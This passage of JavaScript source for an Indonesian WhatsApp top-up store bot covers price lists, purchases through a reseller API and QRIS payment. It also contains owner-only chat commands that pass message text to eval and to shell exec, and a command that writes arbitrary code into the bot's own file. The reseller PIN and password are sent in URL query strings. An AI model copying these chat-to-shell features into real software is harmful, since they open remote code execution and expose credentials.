          const status = item.status === "1" ? "Ready ✅" : "Close ❌";
          return `≫ *${item.keterangan}* 🌟
> Harga: Rp${toRupiahh(finalPrice)}
> Status: ${status}
> Pembelian : ${prefix}beli ${item.kode}|NOMER`;
      });

      const message = `Selamat Datang Di SPNB STORE. Tempat Topup Pulsa Dengan Harga Yang Murah,Legal,Dan Aman🤩

⧼ 𝗣𝗿𝗶𝗰𝗲𝗹𝗶𝘀𝘁 𝗛𝗮𝗿𝗴𝗮 ⧽\n\n${list.join('\n\n')}

SPNB STORE
${tanggalnew} || ${wib}`;

      // Format pengiriman pesan sama seperti sebelumnya
      await conn.sendMessage(m.chat, {
        footer: `© 2025 ${botname}`,
        buttons: [
            {buttonId: `.menu`, buttonText: { displayText: 'Menu' }, type: 1},
            {buttonId: `.owner`, buttonText: { displayText: 'Owner' }, type: 1}
        ],
        headerType: 1,
        viewOnce: true,
        document: fs.readFileSync("./package.json"),
        fileName: `By ${namaOwner} </>`,
        mimetype: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
        fileLength: 99999999,
        caption: message,
        contextInfo: {
            mentionedJid: [m.sender, owner+"@s.whatsapp.net"],
            forwardedNewsletterMessageInfo: {
                newsletterJid: idSaluran,
                newsletterName: namaSaluran
            },
            externalAdReply: {
                title: `${botname} - ${versi}`,
                body: `📍 Runtime : ${runtime(process.uptime())}`,
                thumbnailUrl: global.image.menu,
                sourceUrl: linkSaluran,
                mediaType: 1,
                renderLargerThumbnail: true,
            }
        }
    });

  } catch (error) {
      console.error("Error in Pulsa command:", error);
      m.reply("Terjadi kesalahan saat mengambil data.");
  }
}
break

case "ff": case "freefire": {
  try {
      // Cek pendaftaran
      if (!db.users[m.sender]?.daftar) {
          return m.reply(`🚫 Ups! Kamu Belum Terdaftar Nih!
💡 Ayo gabung sekarang juga!

Caranya gampang:
Ketik ${prefix}daftar username dan jadi bagian dari komunitas keren ini!

🌟 Daftar sekarang, dan nikmati fitur eksklusif kami!`);
      }

      // Cek grup
      if (m.isGroup) {
          return m.reply(`upss 🚫
tidak dapat diakses di dalam grup 😔`);
      }

      const { data } = await axios.get("https://www.okeconnect.com/harga/json?id=905ccd028329b0a");
      
      // Filter dan sort data FF
      let ff = data.filter(v => /TPG Diamond Free Fire/i.test(v.produk) && v.harga > 0)
      ff.sort((a, b) => a.harga - b.harga)

      // Log untuk debug
      console.log("Raw FF Prices:", ff.map(item => ({
          name: item.keterangan,
          basePrice: item.harga
      })))

      const list = ff.map((item) => {
          const basePrice = parseInt(item.harga)
          // Tambah 10% dari harga dasar
          const markup = Math.round(basePrice * 0.1) 
          // Pastikan minimal profit 1000
          const profit = Math.max(markup, 1000)
          // Batasi maksimal profit 10000
          const finalProfit = Math.min(profit, 10000)
          const finalPrice = basePrice + finalProfit

          // Log untuk debug
          console.log(`${item.keterangan}: Base=${basePrice}, Markup=${markup}, Profit=${finalProfit}, Final=${finalPrice}`)

          const status = item.status === "1" ? "Ready ✅" : "Close ❌";
          return `≫ *${item.keterangan}* 🌟
> Harga: Rp${toRupiahh(finalPrice)}
> Status: ${status}
> Pembelian : ${prefix}beli ${item.kode}|ID`;
      });

      const message = `Selamat Datang Di SPNB STORE. Tempat Topup Game Free Fire Dengan Harga Yang Murah,Legal,Dan Aman🤩

⧼ 𝗣𝗿𝗶𝗰𝗲𝗹𝗶𝘀𝘁 𝗛𝗮𝗿𝗴𝗮 ⧽\n\n${list.join('\n\n')}

SPNB STORE
${tanggalnew} || ${wib}`;

      await conn.sendMessage(m.chat, {
          footer: `© 2025 ${botname}`,
          buttons: [
              {
                  buttonId: `.menu`,
                  buttonText: { displayText: 'Menu' },
                  type: 1
              },
              {
                  buttonId: `.owner`,
                  buttonText: { displayText: 'Owner' },
                  type: 1
              }
          ],
          headerType: 1,
          viewOnce: true,
          document: fs.readFileSync("./package.json"),
          fileName: `By ${namaOwner} </>`,
          mimetype: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
          fileLength: 99999999,
          caption: message,
          contextInfo: {
              mentionedJid: [m.sender, owner+"@s.whatsapp.net"],
              forwardedNewsletterMessageInfo: {
                  newsletterJid: idSaluran,
                  newsletterName: namaSaluran
              },
              externalAdReply: {
                  title: `${botname} - ${versi}`,
                  body: `📍 Runtime : ${runtime(process.uptime())}`,
                  thumbnailUrl: global.image.menu,
                  sourceUrl: linkSaluran,
                  mediaType: 1,
                  renderLargerThumbnail: true,
              },
          },
      });

  } catch (error) {
      console.error("Error in FF command:", error);
      m.reply("Terjadi kesalahan saat mengambil data. Silakan coba lagi nanti.");
  }
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case "beli": {
  if (!db.users[m.sender].daftar) return m.reply(`🚫 Ups! Belum terdaftar! Ketik .daftar untuk bergabung.`)
  try {
      let [produk, id] = text.split("|")
      if (!produk || !id) return m.reply("Format: .beli KODE|ID/NOMER")

      const { data } = await axios.get("https://www.okeconnect.com/harga/json?id=905ccd028329b0a")
      let item = data.find(v => v.kode === produk)
      if (!item) return m.reply("Kode produk tidak valid")
      if (item.status !== "1") return m.reply("Produk sedang tidak tersedia")

      // Tentukan kategori produk dan atur profit
      let basePrice = parseInt(item.harga)
      let profit, finalPrice

      if (/TPG Diamond Free Fire|TPG Diamond Mobile Legends|TPG PUBG Mobile/i.test(item.produk)) {
          // Game
          profit = Math.min(Math.max(Math.round(basePrice * 0.1), 1000), 10000)
      } else if (/Top Up Saldo DANA|Top Up Saldo OVO|Top Up Saldo GOPAY/i.test(item.produk)) {
          // E-wallet
          profit = Math.min(Math.max(Math.round(basePrice * 0.05), 500), 5000)
      } else if (/Pulsa|Paket Data/i.test(item.produk)) {
          // Pulsa & Data
          profit = Math.min(Math.max(Math.round(basePrice * 0.08), 1000), 8000)
      } else if (/Token PLN/i.test(item.produk)) {
          // PLN
          profit = Math.min(Math.max(Math.round(basePrice * 0.03), 500), 3000)
      } else {
          // Default
          profit = Math.min(Math.max(Math.round(basePrice * 0.1), 1000), 10000)
      }

      finalPrice = basePrice + profit

      // Validasi format ID/Nomor
      if (/TPG/i.test(item.produk)) {
          // Game ID: biasanya angka atau kombinasi angka huruf
          if (!/^[0-9a-zA-Z]{5,}$/i.test(id.trim())) {
              return m.reply("Format ID game tidak valid!")
          }
      } else if (/Token PLN/i.test(item.produk)) {
          // ID PLN: biasanya 11-12 digit angka
          if (!/^[0-9]{11,12}$/.test(id.trim())) {
              return m.reply("Format ID meteran PLN tidak valid!")
          }
      } else {
          // Nomor HP: 10-13 digit angka
          if (!/^[0-9]{10,13}$/.test(id.trim())) {
              return m.reply("Format nomor tidak valid!")
          }
      }

      const saldoUser = cekSaldo(m.sender, db_saldo)
      // Jika saldo tidak cukup, tawarkan pembayaran langsung
      if (saldoUser < finalPrice) {
          const amount = finalPrice + generateRandomNumber(110, 250)
          
          const teks = `
*💰 Saldo Tidak Cukup*
Saldo Anda: Rp${toRupiah(saldoUser)}
Harga Produk: Rp${toRupiah(finalPrice)}

Pilih metode pembayaran:
1. Deposit dulu (.deposit)
2. Bayar Langsung dengan QRIS di bawah ini

*乂 INFORMASI PEMBAYARAN*
*• Item:* ${item.keterangan}
*• ID Tujuan:* ${id}
*• Total:* Rp${toRupiah(amount)}
*• Expired:* 5 menit
          
*Note:* 
QRIS berlaku 5 menit. Bot akan otomatis memproses setelah pembayaran.`

          try {
              const get = await axios.get(`https://api.spnb.my.id/orkut/createpayment?apikey=${global.apiSimpleBot}&amount=${amount}&codeqr=${global.codeqr}`)
              
              if (!get.data.success) throw new Error("Gagal membuat pembayaran QRIS")

              let msgQr = await conn.sendMessage(m.chat, {
                  footer: `© 2025 ${botname}`,
                  buttons: [{
                      buttonId: `.batalbeli`,
                      buttonText: { displayText: 'Batalkan' },
                      type: 1
                  }],
                  headerType: 1,
                  viewOnce: true,
                  image: {url: get.data.data.qrImageUrl},
                  caption: teks,
                  contextInfo: {
                      mentionedJid: [m.sender]
                  }
              })

              db.users[m.sender].status_deposit = true
              db.users[m.sender].order_pending = {
                  msg: msgQr,
                  chat: m.sender,
                  idDeposit: get.data.data.transactionId,
                  amount: amount.toString(),
                  item: {
                      kode: item.kode,
                      keterangan: item.keterangan,
                      harga: item.harga
                  },
                  id_tujuan: id,
                  expiry: Date.now() + 300000 // 5 minutes from now
              }

              // Handle expiry in separate function
              setTimeout(async () => {
                  if (db.users[m.sender]?.status_deposit) {
                      await conn.sendMessage(m.sender, {
                          text: "Pembayaran expired! Silakan ulangi pembelian."
                      }, {quoted: msgQr})
                      await conn.sendMessage(m.sender, {
                          delete: msgQr.key
                      })
                      db.users[m.sender].status_deposit = false
                      delete db.users[m.sender].order_pending
                  }
              }, 300000)

              // Monitor pembayaran
                  while (db.users[m.sender].status_deposit) {
                    await sleep(8000)
                    try {
                        const resultcek = await axios.get(`https://api.spnb.my.id/orkut/cekstatus?apikey=${global.apiSimpleBot}&merchant=${global.merchantIdOrderKuota}&token=${global.apiOrderKuota}`) // Ubah token menjadi keyorkut
                        
                        console.log('Cek Status Response:', resultcek.data) // Tambah log untuk debugging
                        
                        if (resultcek.data?.data?.amount == amount) { // Sesuaikan dengan struktur response
                            db.users[m.sender].status_deposit = false
                            
                            // Proses order
                            const trxid = "TRX" + Date.now()
                            const order = await axios.get(`https://h2h.okeconnect.com/trx?product=${produk}&dest=${id}&refID=${trxid}&memberID=${memberID}&pin=${pin}&password=${pw}`)
                            
                            if (order.data && !order.data.includes("GAGAL")) {
                                await conn.sendMessage(m.sender, {
                                    text: `*TRANSAKSI BERHASIL ✅*\n\n`+
                                        `*• Produk:* ${item.keterangan}\n`+
                                        `*• ID Tujuan:* ${id}\n`+
                                        `*• Total Bayar:* Rp${toRupiah(amount)}\n`+
                                        `*• Status:* Sukses\n\n`+
                                        `Produk akan masuk otomatis.\n`+
                                        `Terima kasih telah berbelanja! 🙏`
                                }, {quoted: msgQr})
                            } else {
                                await conn.sendMessage(m.sender, {
                                    text: "Transaksi gagal, hubungi admin untuk refund."
                                }, {quoted: msgQr})
                            }
                            
                            delete db.users[m.sender].order_pending
                            break
                        }

                        // Tambahkan pengecekan waktu expired
                        if (Date.now() > db.users[m.sender].order_pending.expiry) {
                            db.users[m.sender].status_deposit = false
                            delete db.users[m.sender].order_pending
                            break
                        }

                    } catch (err) {
                        console.error("Payment check error:", err?.response?.data || err)
                        // Jangan break loop jika error, biarkan retry
                        continue
                    }
                  }

                } catch (err) {
                  console.error("Payment Error:", err)
                  m.reply("Terjadi kesalahan saat membuat pembayaran. Silakan coba lagi.")
              }
              return
          }
  
          // Jika saldo cukup, proses normal
          const trxid = "TRX" + Date.now()
          const order = await axios.get(`https://h2h.okeconnect.com/trx?product=${produk}&dest=${id}&refID=${trxid}&memberID=${memberID}&pin=${pin}&password=${pw}`)
          
          if (order.data && !order.data.includes("GAGAL")) {
              minSaldo(m.sender, finalPrice, db_saldo)
              await conn.sendMessage(m.chat, {
                  text: `*TRANSAKSI BERHASIL ✅*\n\n`+
                       `*• Produk:* ${item.keterangan}\n`+
                       `*• ID Tujuan:* ${id}\n`+
                       `*• Total:* Rp${toRupiah(finalPrice)}\n`+
                       `*• Sisa Saldo:* Rp${toRupiah(cekSaldo(m.sender, db_saldo))}\n`+
                       `*• Status:* Sukses\n\n`+
                       `Produk akan masuk otomatis.\n`+
                       `Terima kasih telah berbelanja! 🙏`
              }, {quoted: m})
          } else {
              m.reply("Transaksi gagal, silakan coba lagi.")
          }
  
      } catch (err) {
          console.error("Error:", err)
          m.reply("Terjadi kesalahan saat memproses pesanan.")
      }
  }
  break
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "addowner": case "addown": {
if (!isCreator) return Reply(mess.owner)
if (!m.quoted && !text) return m.reply(example("6285###"))
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 === global.owner || owners.includes(input) || input === botNumber) return m.reply(`Nomor ${input2} sudah menjadi owner bot!`)
owners.push(input)
await fs.writeFileSync("./library/database/owner.json", JSON.stringify(owners, null, 2))
m.reply(`Berhasil menambah owner ✅`)
}
break

  //~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case "toimg": case "toimage": {
  if (!quoted) return m.reply(example("dengan membalas sticker"))
  if (!/webp/.test(mime)) return m.reply(example("dengan membalas sticker"))  
  m.reply(mess.wait)
  let media = await conn.downloadAndSaveMediaMessage(quoted)
  let ran = await getRandom('.png')
  exec(`ffmpeg -i ${media} ${ran}`, async (err) => {
  fs.unlinkSync(media)
  if (err) return m.reply(err)
  let buffer = fs.readFileSync(ran)
  await conn.sendMessage(m.chat, { image: buffer, caption: "Done!" }, { quoted: m })
  fs.unlinkSync(ran)
  })
  }
  break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case "addcase": {
  if (!isCreator) return Reply(mess.owner)
  if (!text) return m.reply(example("nama case|kode"))
  if (!text.includes("|")) return m.reply(example("nama case|kode"))
  const [name, ...code] = text.split("|")
  const codeFix = code.join("|").trim()
  if (!name || !codeFix) return m.reply("Format salah!")
  
  try {
  const content = fs.readFileSync("./skyzo.js", "utf-8")
  const insertPoint = content.lastIndexOf("//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//") 
  
  // Format case baru
  const newCase = `
  
  case "${name}": {
  ${codeFix}
  }
  break
  
  //~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//`
  
  // Sisipkan case baru
  const newContent = content.slice(0, insertPoint) + newCase + content.slice(insertPoint)
  fs.writeFileSync("./skyzo.js", newContent)
  
  m.reply(`Berhasil menambahkan case *${name}*`)
  } catch (e) {
  m.reply(`Terjadi kesalahan: ${e.toString()}`)
  }
  }
  break

  //~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

default:
if (budy.startsWith('>')) {
if (!isCreator) return
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await m.reply(evaled)
} catch (err) {
await m.reply(String(err))
}}

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

if (m.text.toLowerCase() == "bot") {
m.reply("Online Kak ✅")
}

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

if (budy.startsWith('=>')) {
if (!isCreator) return
try {
let evaled = await eval(`(async () => { ${budy.slice(2)} })()`)
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await m.reply(evaled)
} catch (err) {
await m.reply(String(err))
}}

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

if (budy.startsWith('$')) {
if (!isCreator) return
if (!text) return
exec(budy.slice(2), (err, stdout) => {
if (err) return m.reply(`${err}`)
if (stdout) return m.reply(stdout)
})
}

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
}
} catch (err) {
console.log(util.format(err));
let Obj = global.owner
conn.sendMessage(Obj + "@s.whatsapp.net", {text: `*Hallo developer, telah terjadi error pada command :* ${isCmd ? prefix+command : m.text}

*Detail informasi error :*
${util.format(err)}`, contextInfo: { isForwarded: true }}, {quoted: m})
}}

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

let file = require.resolve(__filename)
fs.watchFile(file, () => {
	fs.unwatchFile(file)
	console.log(chalk.redBright(`Update ${__filename}`))
	delete require.cache[file]
	require(file)
});